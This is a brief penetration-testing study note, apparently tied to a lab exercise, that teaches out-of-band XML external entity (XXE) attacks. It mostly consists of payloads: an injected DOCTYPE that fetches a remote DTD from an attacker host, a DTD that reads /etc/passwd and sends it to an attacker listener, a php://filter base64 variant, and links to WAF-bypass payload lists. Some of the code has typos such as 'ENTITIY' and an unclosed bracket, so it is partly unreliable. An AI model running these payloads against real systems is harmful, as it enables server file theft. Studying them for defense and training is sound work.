# Advanced XML External entities Out of Band (OOB)

## Advanced XXE OOB

### Advanced XML External entities Out of Band (OOB)

* **Payloads (bypass WAF and so on):**

[https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4) [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-Fuzzing.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-Fuzzing.txt)

* **In case we are not able to get a response in the specific tag (char filtering/restriction) we can use a remote Document Type Definition**

### DTD ( D**ocument Type Definition)**

* **DTD is a well structured XML file that definies the structure and the legal element and attributes of a XML file.**

**4 stages attacks :**

```
• Modified XXE XML attack
• Force the Vulnerable XML parser to grab Document Type Definition on our remote attacking machine.
• DTD file contains code to read /etc/passwd
• DTD file contains code to exfil the contents of the data out (on our attacking machine)
```

* **Modified XXE attack :**

```
<!ENTITY %dtd SYSTEM “http://ATTACKER_IP:80/payload.dtd” %dtd;

data=<?xml version="1.0" ?><!DOCTYPE thp [ <!ELEMENT thp ANY><!ENTITY % dtd SYSTEM "http://10.4.4.175/payload.dtd"> %dtd;]<thp><error> %26send%3b</error></thp>
```



![](../../../.gitbook/assets/f45883b481ec44f5b32ff68132a2b1ae.png)

* **Create the payload.dtd on the attacking machine :**

`root@thp3:~/Documents/thp3/exercices/xxe-oob# cat payload.dtd`

```
<!ENTITIY % file SYSTEM "file:///etc/passwd">
<!ENTITIY % all "<!ENTITY send SYSTEM 'http://10.4.4.175:8888/collect=%file;'>">
%all;
```

![](../../../.gitbook/assets/246a4c86f30b4d468229f2481599a1ba.png)

* **Host the file and set up a listener on the attacker machine :**

![](../../../.gitbook/assets/9cdad36a79a045028f8bfeef5ff83bab.png)

* **Getting in parser error and no output :**

![](../../../.gitbook/assets/e9973a44f94248789b2e508c8445ecb5.png)

*   **php wrappers**&#x20;

    * Modify the payload.dtd to encode the output

    `php://filter/read=convert.base64-encode/resource=file:///etc/passwd`

![](../../../.gitbook/assets/68464add04be423abf3c80b11889eb69.png)

![](../../../.gitbook/assets/1f076232e0844ee2bcb9e86aad7a5fd1.png)

![](../../../.gitbook/assets/cabe44e6ad2247a39dfc79231c653f2f.png)



